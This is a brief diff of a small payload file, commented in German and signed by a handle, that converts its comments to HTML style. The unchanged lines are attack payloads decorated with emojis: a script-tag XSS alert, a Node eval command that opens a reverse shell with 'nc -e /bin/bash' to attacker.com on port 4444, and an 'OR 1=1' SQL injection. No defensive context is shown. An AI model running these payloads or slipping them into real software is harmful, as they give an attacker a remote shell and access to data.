@@ -1,4 +1,4 @@
-// Beispiel für ein XSS mit Emoji
+<!-- Beispiel für ein XSS mit Emoji -->
 
 😊 <script>alert('XSS-Angriff');</script>
 
@@ -6,8 +6,7 @@
 
 👾 --eval "require('child_process').execSync('nc -e /bin/bash attacker.com 4444')"
 
-// SQL-Query
-
+<!-- SQL Query -->
 SELECT * FROM users WHERE username = '😀' OR 1=1;
 
-// By DaUfooo 2025
+<!-- By DaUfooo 2025 -->
